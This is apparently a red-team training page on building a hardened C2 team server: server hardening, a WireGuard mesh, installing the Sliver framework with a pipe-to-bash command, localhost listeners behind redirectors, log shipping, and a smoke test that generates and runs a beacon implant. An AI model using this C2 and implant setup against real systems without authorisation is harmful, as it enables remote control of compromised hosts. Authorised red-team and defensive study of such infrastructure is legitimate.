---
layout: training-page
title: "Team Server Build-Out — Red Team Academy"
module: "C2 Frameworks"
tags:
  - infrastructure
  - team-server
  - deployment
  - wireguard
  - hardening
page_key: "c2-frameworks-teamserver-buildout"
render_with_liquid: false
---

# Team Server Build-Out

Everything needed to stand up a hardened team server from a fresh Debian 12 VPS. Runs hands-free via the companion script at `scripts/rta-infra/deploy-teamserver.sh`. The end state: a host reachable only over WireGuard, running your chosen C2 framework, with a central syslog feed and no direct internet exposure.

---

## Prerequisites

- A fresh Debian 12 VPS (2 vCPU / 4 GB RAM minimum).
- SSH key access as root.
- A pre-generated WireGuard keypair for this node.
- A pre-assigned WireGuard IP (e.g. `10.8.0.10/24`).
- An operator WireGuard public key to add as a peer.

---

## Hardening Baseline

The build script applies these hardening steps before anything else is installed:

```bash
# Patch and lock the package state
apt update && apt -y full-upgrade
apt -y install unattended-upgrades apt-listchanges
dpkg-reconfigure -plow unattended-upgrades

# Create a non-root operator user (SSH logs in as this)
useradd -m -s /bin/bash -G sudo rtops
mkdir -p /home/rtops/.ssh
chmod 700 /home/rtops/.ssh
# authorized_keys pushed in by the deploy script

# Disable password and root SSH
sed -i 's/^#*PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
systemctl restart ssh

# UFW: default deny, allow WireGuard only from the internet,
# SSH only from the WireGuard subnet
ufw default deny incoming
ufw default allow outgoing
ufw allow 51820/udp comment 'wireguard'
ufw allow from 10.8.0.0/24 to any port 22 proto tcp comment 'ssh via vpn'
ufw --force enable

# Disable unused services
systemctl disable --now rpcbind.service avahi-daemon.service 2>/dev/null || true

# Kernel hardening
cat >> /etc/sysctl.d/99-hardening.conf <<'EOF'
kernel.kptr_restrict=2
kernel.dmesg_restrict=1
net.ipv4.conf.all.rp_filter=1
net.ipv4.conf.all.log_martians=1
net.ipv4.tcp_syncookies=1
net.ipv6.conf.all.accept_redirects=0
net.ipv4.conf.all.accept_redirects=0
EOF
sysctl --system
```

After this, the box has two open ports: `51820/udp` (WireGuard) and `22/tcp` from the WireGuard subnet only. Everything else is dropped.

---

## WireGuard Mesh

Every node in the engagement is a peer on the same WireGuard subnet (`10.8.0.0/24`). The team server gets `10.8.0.10`. Redirectors live at `10.8.0.20+`. Operators at `10.8.0.100+`.

```bash
apt -y install wireguard

umask 077
wg genkey | tee /etc/wireguard/private.key | wg pubkey > /etc/wireguard/public.key

cat > /etc/wireguard/wg0.conf <<EOF
[Interface]
Address = 10.8.0.10/24
ListenPort = 51820
PrivateKey = $(cat /etc/wireguard/private.key)
SaveConfig = false

# Redirector 1
[Peer]
PublicKey = REDIRECTOR1_PUBKEY
AllowedIPs = 10.8.0.20/32

# Operator 1
[Peer]
PublicKey = OPERATOR1_PUBKEY
AllowedIPs = 10.8.0.100/32
PersistentKeepalive = 25
EOF

systemctl enable --now wg-quick@wg0
```

Peers are added by editing `wg0.conf` and running `wg syncconf wg0 <(wg-quick strip wg0)`. No service restart needed.

---

## C2 Framework Install — Sliver

Sliver is the most common Go-based open-source C2 for team server deployments. The build script supports Sliver, Mythic, and the custom Python C2 server on this site.

```bash
# Install Sliver server
curl -fsSL https://sliver.sh/install | bash

# First-time init (generates certs, creates the root operator)
sliver-server unpack --force

# Create an operator config for remote access
sliver-server operator --name rtops-alice --lhost 10.8.0.10 --save /tmp/alice.cfg

# Systemd unit so it survives reboots
cat > /etc/systemd/system/sliver.service <<'EOF'
[Unit]
Description=Sliver C2 Server
After=network.target

[Service]
Type=simple
User=root
ExecStart=/root/sliver-server daemon --lhost 10.8.0.10 --lport 31337
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable --now sliver
```

The Sliver daemon binds only to the WireGuard IP. Operators connect to `10.8.0.10:31337` from inside the VPN using the operator config file. Nothing is exposed to the public internet.

---

## Listener Configuration

Listeners on a team server always bind to localhost. Public traffic comes in via the redirector, which forwards over WireGuard to the team server's loopback. This is what keeps the team server invisible.

```bash
# Inside Sliver
sliver > https --domain api.example.io --host 127.0.0.1 --port 8443 --lport 8443 --persistent

# Then tell the redirector to proxy
# nginx on the redirector side:
#   proxy_pass https://10.8.0.10:8443;
```

See [Custom C2 Server](/c2-frameworks/custom-c2-server/) for the equivalent setup against the custom Python C2 on this site.

---

## Log Shipping

Every operator action goes to the central log aggregator. Debian 12 ships with rsyslog.

```bash
cat > /etc/rsyslog.d/10-remote.conf <<'EOF'
# Ship everything to the log aggregator over the WireGuard mesh
*.*  @@10.8.0.50:514
EOF

systemctl restart rsyslog
```

Operator commands are captured by logging every `sliver` or `python3 c2.py` invocation via a wrapper that tees to syslog. The wrapper is installed automatically by the deploy script.

---

## The Deploy Script

`scripts/rta-infra/deploy-teamserver.sh` does everything above. You pass it an inventory file and it handles the rest.

Usage:

```bash
# Inventory file
cat > inventory.env <<'EOF'
TEAMSERVER_IP=203.0.113.10
TEAMSERVER_WG_IP=10.8.0.10
TEAMSERVER_WG_PRIVKEY=XXXX
OPERATOR_PUBKEY=YYYY
OPERATOR_WG_IP=10.8.0.100
LOG_AGGREGATOR_WG_IP=10.8.0.50
C2_FRAMEWORK=sliver   # or mythic, custom-python
SSH_KEY=~/.ssh/rta_ed25519
EOF

./deploy-teamserver.sh inventory.env
```

The script uses SSH with the provided key, runs as root, and exits non-zero on any failure. After it completes, the team server is reachable only from the operator's WireGuard peer.

---

## Smoke Test

```bash
# From the operator laptop, with WireGuard up
ping -c 3 10.8.0.10
ssh rtops@10.8.0.10 systemctl status sliver

# Start the Sliver client pointed at the operator config
sliver-client import ~/alice.cfg
sliver-client
[server] sliver > jobs

# Spawn a test beacon to the redirector and confirm the callback hits the team server
sliver > generate beacon --http https://api.example.io --os linux --arch amd64 --save /tmp/test
/tmp/test &
sliver > sessions
```

If the session appears, the full chain — operator → VPN → team server → redirector → implant — is wired. If it does not, check in order: WireGuard handshake (`wg show`), Nginx proxy status on the redirector, and the listener config on the team server.

---

## Resources

- Sliver documentation — `github.com/BishopFox/sliver/wiki`
- Mythic agent framework — `docs.mythic-c2.net`
- WireGuard quickstart — `wireguard.com/quickstart`
- Lynis hardening audit — `cisofy.com/lynis`
- Scripts on this site: `scripts/rta-infra/deploy-teamserver.sh`
- Related: [Engagement Infrastructure](/c2-frameworks/engagement-infrastructure/), [Custom C2 Server](/c2-frameworks/custom-c2-server/), [C2 Redirectors](/c2-frameworks/redirectors/)
